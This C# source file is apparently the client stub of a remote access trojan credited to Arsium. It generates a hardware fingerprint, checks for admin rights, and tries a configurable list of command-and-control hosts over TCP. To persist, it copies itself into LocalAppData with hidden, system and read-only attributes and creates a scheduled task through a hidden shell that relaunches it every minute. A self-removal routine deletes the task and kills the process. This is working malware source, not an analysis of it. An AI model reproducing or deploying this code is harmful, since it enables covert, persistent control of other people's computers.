using Microsoft.VisualBasic;
using Shared;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Client
{
    public static class Utils
    {
        private static Mutex MT;
        private static string MUTEX = "IM-" + HwidGen.HWID();
        private static bool OW = false;
        internal static string ProgramPath = Application.ExecutablePath;
        internal static string ExecName = System.AppDomain.CurrentDomain.FriendlyName;

        [DllImport("kernel32.dll")]
        private static extern bool SetFileAttributes(string lpFileName, FileAttributes dwFileAttributes);
        //SetFileAttributes 

        [Flags]
        private enum FileAttributes : uint
        {
            Readonly = 0x00000001,
            Hidden = 0x00000002,
            System = 0x00000004,
        }

        //From Async HWID Generator + https://stackoverflow.com/questions/2333149/how-to-fast-get-hardware-id-in-c
        public static class HwidGen
        {
            private static string identifier(string wmiClass, string wmiProperty, string wmiMustBeTrue)
            {
                string result = "";
                System.Management.ManagementClass mc = new System.Management.ManagementClass(wmiClass);
                System.Management.ManagementObjectCollection moc = mc.GetInstances();
                foreach (System.Management.ManagementObject mo in moc)
                {
                    if (mo[wmiMustBeTrue].ToString() == "True")
                    {
                        //Only get the first one
                        if (result == "")
                        {
                            try
                            {
                                result = mo[wmiProperty].ToString();
                                break;
                            }
                            catch
                            {
                            }
                        }
                    }
                }
                return result;
            }

            private static string identifier(string wmiClass, string wmiProperty)
            {
                string result = "";
                System.Management.ManagementClass mc = new System.Management.ManagementClass(wmiClass);
                System.Management.ManagementObjectCollection moc = mc.GetInstances();
                foreach (System.Management.ManagementObject mo in moc)
                {
                    //Only get the first one
                    if (result == "")
                    {
                        try
                        {
                            result = mo[wmiProperty].ToString();
                            break;
                        }
                        catch
                        {
                        }
                    }
                }
                return result;
            }
            /*private static string cpuId()
            {
                //Uses first CPU identifier available in order of preference
                //Don't get all identifiers, as it is very time consuming
                string retVal = identifier("Win32_Processor", "UniqueId");
                if (retVal == "") //If no UniqueID, use ProcessorID
                {
                    retVal = identifier("Win32_Processor", "ProcessorId");
                    if (retVal == "") //If no ProcessorId, use Name
                    {
                        retVal = identifier("Win32_Processor", "Name");
                        if (retVal == "") //If no Name, use Manufacturer
                        {
                            retVal = identifier("Win32_Processor", "Manufacturer");
                        }
                        //Add clock speed for extra security
                        retVal += identifier("Win32_Processor", "MaxClockSpeed");
                    }
                }
                return retVal;
            }
            //BIOS Identifier
            private static string biosId()
            {
                return identifier("Win32_BIOS", "Manufacturer")
                + identifier("Win32_BIOS", "SMBIOSBIOSVersion")
                + identifier("Win32_BIOS", "IdentificationCode")
                + identifier("Win32_BIOS", "SerialNumber")
                + identifier("Win32_BIOS", "ReleaseDate")
                + identifier("Win32_BIOS", "Version");
            }*/
            //Main physical hard drive ID
            private static string diskId()
            {
                return identifier("Win32_DiskDrive", "Model")
                + identifier("Win32_DiskDrive", "Manufacturer")
                + identifier("Win32_DiskDrive", "Signature")
                + identifier("Win32_DiskDrive", "TotalHeads");
            }
            //Motherboard ID
            private static string baseId()
            {
                return identifier("Win32_BaseBoard", "Model")
                + identifier("Win32_BaseBoard", "Manufacturer")
                + identifier("Win32_BaseBoard", "Name")
                + identifier("Win32_BaseBoard", "SerialNumber");
            }
            //Primary video controller ID
            /*private static string videoId()
            {
                return identifier("Win32_VideoController", "DriverVersion")
                + identifier("Win32_VideoController", "Name");
            }
            //First enabled network card ID
            private static string macId()
            {
                return identifier("Win32_NetworkAdapterConfiguration",
                    "MACAddress", "IPEnabled");
            }*/

            public static string HWID()
            {
                try
                {
                    return GetHash(string.Concat(baseId(), Environment.ProcessorCount, Environment.UserName,
                        Environment.MachineName, Environment.OSVersion
                        , new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize, diskId()));
                }
                catch
                {
                    return "Err HWID";
                }
            }

            public static string GetHash(string strToHash)
            {
                MD5CryptoServiceProvider md5Obj = new MD5CryptoServiceProvider();
                byte[] bytesToHash = Encoding.ASCII.GetBytes(strToHash);
                bytesToHash = md5Obj.ComputeHash(bytesToHash);
                StringBuilder strResult = new StringBuilder();
                foreach (byte b in bytesToHash)
                    strResult.Append(b.ToString("x2"));
                return strResult.ToString().Substring(0, 20).ToUpper();
            }
        }

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern uint NtTerminateProcess(IntPtr hProcess, int errorStatus);

        public static string Check64Bit()
        {
            if (Environment.Is64BitProcess)
            {
                return "64";
            }
            else
            {
                return "32";
            }
        }
        public static string Privilege()
        {
            var ID = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(ID);
            if (principal.IsInRole(WindowsBuiltInRole.Administrator))
            {
                return "Admin";
            }
            else
            {
                return "User";
            }
        }
        public static void OneInstance()
        {
            MT = new Mutex(true, MUTEX, out OW);
            if (!OW)
            {
                Environment.Exit(0);
            }
        }
        public static Host CheckHost()
        {
            foreach (Host H in Starting.HostsList)
            {
                try
                {
                    IPEndPoint ep = new IPEndPoint(IPAddress.Parse(H.host), H.port);

                    using (Socket S = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp))
                    {
                        S.ReceiveBufferSize = Shared.Utils.BufferSize;
                        S.SendBufferSize = Shared.Utils.BufferSize;
                        S.Connect(ep);
                    }
                    return H;
                }
                catch (Exception)
                {
                }
            }
            return null;
        }
        public static void MakeHostList()
        {
            string[] s = Strings.Split(Starting.ListOfHost, "|-|");
            foreach (string h in s)
            {
                if (String.IsNullOrEmpty(h) == false)
                {
                    string[] p = Microsoft.VisualBasic.Strings.Split(h, ":");
                    Starting.HostsList.Add(new Host(p[0], int.Parse(p[1])));
                }
            }
        }

        public static void StartUpTaskScheduler() 
        {
            if (Starting.TaskName == "%C%" || Starting.TaskName == "")
            {
                return;
            }
            try
            {
                string newPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + ExecName;

                if (File.Exists(newPath) == false)
                {
                    File.WriteAllBytes(newPath, System.IO.File.ReadAllBytes(ProgramPath));
                    SetFileAttributes(newPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.Readonly);        
                }
                string ShellCMD = "schtasks /create /sc minute /mo 1 /tn \"||\" /tr \"" + newPath + "\"";
                Interaction.Shell(ShellCMD.Replace("||", Starting.TaskName).Replace("1", Starting.Time), AppWinStyle.Hide, false, -1);
            }
            catch{ }
        }

        public static void RemoveTaskScheduler() 
        {
            try
            {
                string newPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + ExecName;
                string ShellCMD = "schtasks /delete /tn " + Starting.TaskName + " /f";
                Interaction.Shell(ShellCMD, AppWinStyle.Hide, false, -1);
                NtTerminateProcess(Process.GetCurrentProcess().Handle, 0);
            }
            catch { }
        }
    }
}
